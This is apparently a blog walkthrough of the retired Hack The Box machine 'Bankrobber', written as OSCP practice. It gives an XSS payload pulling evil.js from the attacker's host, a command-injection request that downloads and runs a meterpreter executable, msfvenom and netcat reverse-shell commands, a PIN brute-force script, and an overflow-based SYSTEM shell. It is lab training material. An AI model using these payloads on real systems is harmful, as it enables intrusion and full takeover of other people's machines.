---
layout: post
title: "Bankrobber"
categories: HTB-Walkthrough
---


![bankrobber](/assets/img/bankrobber/bankrobber1.png)



Bankrobber is a new box on TJNull's OSCP-like list from HTB's 'retired' archive. 

It is indeed very reminiscent of techniques encountered in the PWK labs.



nmap first:



<h3>Nmap</h3>


```
nmap -sV -Pn -p- 10.10.10.154 |tee -a bank.txt
```

the scan takes a short while.

```

Nmap scan report for 10.10.10.154
Host is up (0.13s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

```



![web](/assets/img/bankrobber/br-web.png)


Registered as boo/password1

Logged in ok.


![web-transfer](/assets/img/bankrobber/br-web-transfer.png)


The top 2 fields are numerical, the `comment` field allows text.


Once the `Transfer E-coin` button is pressed, we get a pop-up alert informing us that the transaction
is awaiting Admin approval.

Somewhere, Admin spots the transaction, and must open the log to view the contents, then approve.

This is likely to be automated on this box. We can potentially use XSS to perform a client-side attack.


![notes](/assets/img/bankrobber/br-notes.png)


Localhost being used for the backend?


<hr width="250" size="6">



<h3>Exploit</h3>


Place a XSS command that will invoke an evil.js script on Kali, 



```
<script src="http://10.10.14.7/evil.js"></script>
```


evil.js will use powershell (we know our target is likely Windows10) to put a meterpreter exploit on the target, and execute it.

```

var request = new XMLHttpRequest();
var params = 'cmd=dir|powershell -c "iwr -uri 10.10.14.7/evilM.exe -outfile %temp%\\evilM.exe"; %temp%\\evilM.exe';
request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
request.send(params);

```

msfvenom command for meterpreter reverse shell:
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.7 lport=6969 -f exe -o evilM.exe
```


We'll need to use Metasploit's multi/handler to catch the shell.

![multihandler](/assets/img/bankrobber/br-multi-handler.png)


Get a python webserver running to serve evil.js and evilM.exe
```
python3 -m http.server 80
```



![exploit xss](/assets/img/bankrobber/br-xss-script-eviljs.png)



<hr width="250" size="6">




<h3>Privilege Escalation</h3>





![getuid](/assets/img/bankrobber/br-meterpreter-getuid.png)


get cli shell with `shell` command.

```

Host Name:                 BANKROBBER
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows-gebruiker
Registered Organization:   
Product ID:                00330-80128-99179-AA272
Original Install Date:     24-4-2019, 17:50:48
System Boot Time:          15-3-2020, 01:28:12
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 19-6-2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             nl;Nederlands (Nederland)
Input Locale:              en-us;Engels (Verenigde Staten)
Time Zone:                 (UTC+01:00) Amsterdam, Berlijn, Bern, Rome, Stockholm, Wenen
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.255 MB
Virtual Memory: Max Size:  4.799 MB
Virtual Memory: Available: 3.581 MB
Virtual Memory: In Use:    1.218 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.154
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```

Grab the user flag.

```

c:\Users\Cortin\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C80C-B6D3

 Directory of c:\Users\Cortin\Desktop

25-04-2019  21:16    <DIR>          .
25-04-2019  21:16    <DIR>          ..
25-04-2019  02:40                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  32.814.239.744 bytes free

c:\Users\Cortin\Desktop>type user.txt
type user.txt
f6xxxxxxxxxxxxxxxxxxxxxxxxxxxxac

```




<hr width="250" size="6">


There is an interesting executable in the C:\ directory, but we haven't got the privileges to do anything with it.


```

c:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C80C-B6D3

 Directory of c:\

25-04-2019  18:50            57.937 bankv2.exe
17-03-2020  13:06    <DIR>          boo
24-04-2019  23:27    <DIR>          PerfLogs
22-08-2019  19:04    <DIR>          Program Files
27-04-2019  15:02    <DIR>          Program Files (x86)
24-04-2019  17:52    <DIR>          Users
16-08-2019  16:29    <DIR>          Windows
16-03-2020  01:02    <DIR>          xampp
               1 File(s)         57.937 bytes
               7 Dir(s)  32.814.239.744 bytes free

```



<hr width="250" size="6">



Recall the target's use of `localhost`, use `netstat` to see what network services are listening, or connected.

```

c:\>netstat -ant
netstat -ant

Active Connections

  Proto  Local Address          Foreign Address        State           Offload State

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:910            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       InHost      

<--snip-->

```

Notice that port 910 is listening, it did'nt show on the initial nmap scan.



<hr width="250" size="6">


Use powershell InvokeWeb-Requests to download nc.exe from Kali machine.

```
powershell iwr -uri http://10.10.14.7/nc.exe -outfile c:\boo\nc.exe
```

use nc.exe to contact port 910 on localhost.

`c:\boo\nc.exe 127.0.0.1 910`

```

c:\boo>c:\boo\nc.exe 127.0.0.1 910
c:\boo\nc.exe 127.0.0.1 910

 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] ooo
 [!] Access denied, disconnecting client....

```

To crack the PIN we need to forward the localhost port to Kali, and run the script from there.

```

c:\boo>exit
exit
meterpreter > portfwd add -l 910 -p 910 -r 10.10.10.154
[*] Local TCP relay created: :910 <-> 10.10.10.154:910

```


Test the script:
```shell

#!/bin/bash

rhost=127.0.0.1                                                                                                    
rport=910                                                                                                          
                                                                                                                   
for x in {0..9}{0..9}{0..9}{0..9};do                                                                               
        echo $x |nc $rhost $rport 2>&1 |sed -r '$!d' | echo "$x";                                                  
done          

```

The script is very crude, but I hoped to spot the difference in the timing of the responses.
It was going to be painful to watch the script iterating over each attempt, 
but it soon paused for a long time when trying `0021`.

`ctrl + c` killed the script.

testing the PIN was successful. 


![pin-correct](/assets/img/bankrobber/br-pin-correct.png)


The program requred an amount to transfer, then executed a transfer tool at:

```
C:\Users\admin\Documents\transfer.exe
```



<hr width="250" size="6">


I decided to fuzz the amount field to see if I could crash it, cause a buffer overflow, and code execution.

Metasploit's `pattern_create.rb` can help quickly identify the offset in this circumstance:

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1024
```

this produced a string pattern which could help identify the point at which the program crashes.

```

 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B
 [$] Transfering $Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: 0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae

```


Notice something odd in the output this time, the program tries to execute the transfer tool, but prints out our pattern after a certain point.

It is trying to execute from `0Ab1` onwards, the 4 bytes immediately before this were `Aa9A` 


this was passed to Metasploit's `pattern_offset.rb`:

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q Aa9A
[*] Exact match at offset 27
```

If we pass a buffer of 27 bytes then a command, the program will possibly execute whatever we choose.




<hr width="250" size="6">


I copy the pattern before the `0Ab1` sequence, and append a netcat command.


```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9AbC:\boo\nc.exe 10.10.14.7 8888 -e cmd
```

I had to reset the machine to try again.


The buffer overflow worked 1st time!
I got a SYSTEM shell to my netcat listener:


![gotsystem](/assets/img/bankrobber/br-gotsystem.png)


From there I just needed to collect the root flag.

```

c:\Users\admin\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C80C-B6D3

 Directory of c:\Users\admin\Desktop

27-04-2019  14:55    <DIR>          .
27-04-2019  14:55    <DIR>          ..
25-04-2019  02:39                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  32.141.885.440 bytes free

c:\Users\admin\Desktop>type root.txt
type root.txt
aaxxxxxxxxxxxxxxxxxxxxxxxxxxxx97

```


If you are about to start the PWK labs in order to do the OSCP exam, this box invaluable practice!

:)


